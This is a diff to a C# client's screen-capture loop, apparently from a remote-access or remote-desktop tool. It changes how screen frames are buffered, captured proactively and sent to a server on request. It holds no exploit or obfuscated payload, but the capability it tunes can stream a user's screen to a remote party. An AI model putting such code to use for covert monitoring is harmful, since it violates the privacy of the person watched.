@@ -300,26 +300,33 @@ namespace Pulsar.Client.Messages
             {
                 try
                 {
-                    // wait for frame requests if the buffer is full or no frames are requested
-                    if (_frameBuffer.Count >= MAX_BUFFER_SIZE || _pendingFrameRequests <= 0)
+                    // Wait only if the buffer is full. Capture proactively otherwise.
+                    if (_frameBuffer.Count >= MAX_BUFFER_SIZE)
                     {
-                        Debug.WriteLine($"Waiting for frame requests. Buffer size: {_frameBuffer.Count}, Pending requests: {_pendingFrameRequests}");
-                        _frameRequestEvent.WaitOne(500);
+                        // Wait for a frame request signal OR a short timeout to re-check buffer/cancellation
+                        _frameRequestEvent.WaitOne(100); // Reduced timeout
 
-                        // if cancellation was requested during the wait
-                        if (cancellationToken.IsCancellationRequested)
-                            break;
+                        // Check cancellation after wait
+                        if (cancellationToken.IsCancellationRequested) break;
 
-                        continue;
+                        // If buffer is still full after wait, continue waiting
+                        if (_frameBuffer.Count >= MAX_BUFFER_SIZE) continue;
                     }
 
-                    // capture frame and add to buffer
+                    // Capture frame and add to buffer (if buffer is not full)
+                    // This part now runs more often, as long as the buffer has space.
                     byte[] frameData = CaptureFrame();
-                    if (frameData != null)
+                    if (frameData != null && _frameBuffer.Count < MAX_BUFFER_SIZE) // Check again before enqueueing
                     {
                         _frameBuffer.Enqueue(frameData);
 
-                        // increment frame counter for statistics
+                        // Trigger sending if requests are pending
+                        if (_pendingFrameRequests > 0)
+                        {
+                            _frameRequestEvent.Set(); // Signal that a new frame is available
+                        }
+
+                        // Frame counter stats (optional, keep as is)
                         _frameCount++;
                         if (_stopwatch.ElapsedMilliseconds >= 1000)
                         {
@@ -328,11 +335,27 @@ namespace Pulsar.Client.Messages
                             _stopwatch.Restart();
                         }
                     }
+                    else if (frameData == null)
+                    {
+                        // Optional: Add a small delay if capture failed repeatedly
+                        Thread.Sleep(50);
+                    }
 
-                    // send frames if we have pending requests
+                    // Send frames if we have pending requests and frames available
                     while (_pendingFrameRequests > 0 && _frameBuffer.TryDequeue(out byte[] frameToSend))
                     {
                         SendFrameToServer(frameToSend, Interlocked.Decrement(ref _pendingFrameRequests) == 0);
+                         // If we successfully sent a frame, reset the event just in case
+                         // it was set unnecessarily while requests were being processed.
+                         _frameRequestEvent.Reset();
+                    }
+
+                    // If no requests are pending, wait for the next request signal.
+                    // This prevents a tight loop when idle.
+                    if (_pendingFrameRequests <= 0)
+                    {
+                        _frameRequestEvent.WaitOne(100); // Wait for server request or timeout
+                        if (cancellationToken.IsCancellationRequested) break;
                     }
                 }
                 catch (Exception ex)
